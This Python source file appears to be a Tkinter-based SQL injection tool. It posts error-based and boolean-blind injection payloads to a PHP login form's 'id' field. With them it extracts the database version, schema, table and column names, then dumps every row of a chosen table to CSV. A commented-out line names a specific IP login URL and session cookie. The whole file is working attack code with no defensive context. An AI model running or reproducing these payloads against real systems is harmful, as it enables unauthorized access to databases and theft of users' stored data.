import requests
from bs4 import BeautifulSoup
from tkinter import messagebox
import pandas
import tkinter
from tkinter import Label, LabelFrame, Toplevel, ttk

#url = "http://104.197.42.200/html/member/login_ok.php"
#cookies = {'PHPSESSID': 'l7j1upr6tomr6d0mephanot9a1'}
check = '로그인 성공'.encode()

def extract(value):
  result = ''
  start = value.find("~") 
  end = value.find("~", start+1)

  result = value[(start+1):end]
  return result


def find_db_version(url, cookies):
  result = ''
  value = "' or 1=1 and (select 1 from(select count(*), concat((select (select concat(0x7e, cast(version() as char), 0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); #"
  params = {'id': value, 'pw': 'test'}
  response = requests.post(url, data=params, cookies=cookies)
  soup = BeautifulSoup(response.text, "html.parser")
  result = extract(soup.p.text)

  return result


def count_db(url, cookies):
  result = 0
  while 1:
    value = "' or (select count(distinct table_schema) from information_schema.tables) = {}#".format(result)
    print(value)
    params = {'id': value, 'pw': 'test'}
    response = requests.post(url, data=params, cookies=cookies)
    if check in response.text.encode('utf-8'):
      break
    else:
      result += 1
  return result

def count_data(url, cookies, table_name):
  result = 0
  while 1:
    value = "' or 1=1 and (SELECT count(*) from {}) = {}#".format(table_name, result)
    params = {'id': value, 'pw': 'test'}
    response = requests.post(url,data=params, cookies=cookies)
    print(value)
    if check in response.text.encode('utf-8'):
      break
    else:
      result += 1
  return result


def find_db_name(values, url, cookies):
    size = count_db(url, cookies)
 
    for loop in range(size):
      value = "' or 1=1 and (select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e, cast(schema_name as char), 0x7e) FROM information_schema.schemata LIMIT {},1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #".format(loop)
      print(value)
      params = {'id': value, 'pw': 'test'}
      response = requests.post(url, data=params, cookies=cookies)

      if(check in response.text.encode('utf-8')):
        break
      else:
        soup = BeautifulSoup(response.text, "html.parser")
        values.append(extract(soup.p.text))
  
    print(values)
    messagebox.showinfo("성공", "db name 추출 완료")
    return values

def find_table_name(tableList, url, cookies, db_name):
  size = 0
  while 1:
    value = "' or 1=1 and (select 1 from (select count(*), concat(0x7e, (select table_name from information_schema.tables where table_type = 'base table' and table_schema = '{}'limit {},1), 0x7e, floor(rand(0)*2))a from information_schema.tables group by a)b) #".format(db_name,size)
    params = {'id': value, 'pw': 'test'}
    response = requests.post(url, data=params, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")
    print(value)
    if(check in response.text.encode('utf-8')):
      break
    else:
      size += 1
      tableList.append(extract(soup.p.text))
      
  print(tableList)
  messagebox.showinfo("성공", "table 추출 완료")
  return tableList


def find_column_name(columnList, url, cookies, table_name):
    size = 0
    while 1:
      value = "' or 1=1 and (select 1 from (select count(*), concat(0x7e, (select column_name from information_schema.columns where table_name = '{}' limit {},1),0x7e, floor(rand(0)*2))a from information_schema.TABLES group by a)b) #".format(table_name, size)
      params = {'id': value, 'pw': 'test'}
      response = requests.post(url, data=params, cookies=cookies)
      soup = BeautifulSoup(response.text, "html.parser")
      print(value)
      if(check in response.text.encode('utf-8')):
        break
      else:
        size += 1
        columnList.append(extract(soup.p.text))
        
    print(columnList)
    messagebox.showinfo("성공", "column 추출 완료")
    return columnList


def dump_data(url, cookies, table_name, column_list):
  result = ''
  size = 0
  count = count_data(url, cookies, table_name)
  dict = {}
    
  for column_name in column_list:
    list = []
    for size in range(count):
      value = "' or 1=1 and (select 1 from (select count(*), concat(0x7e, (select {} from {} limit {},1), 0x7e, floor(rand(0)*2))a from information_schema.tables group by a)b) #".format(column_name, table_name, size)
      params = {'id': value, 'pw': 'test'}
      response = requests.post(url, data=params, cookies=cookies)
      soup = BeautifulSoup(response.text, "html.parser")
      print(value)
      if check in response.text.encode('utf-8'):
        list.append("NULL")
        break
      else:
        res = extract(soup.p.text)
        if res == '':
          list.append('NULL')
        else:
          list.append(res)
        
    
    dict[column_name] = list
    size += 1
  
  print(dict)
  dataFrame = pandas.DataFrame(dict)
  dataFrame.to_csv('{}.csv'.format(table_name))
  messagebox.showinfo("성공", "data dump 완료")
  return dict
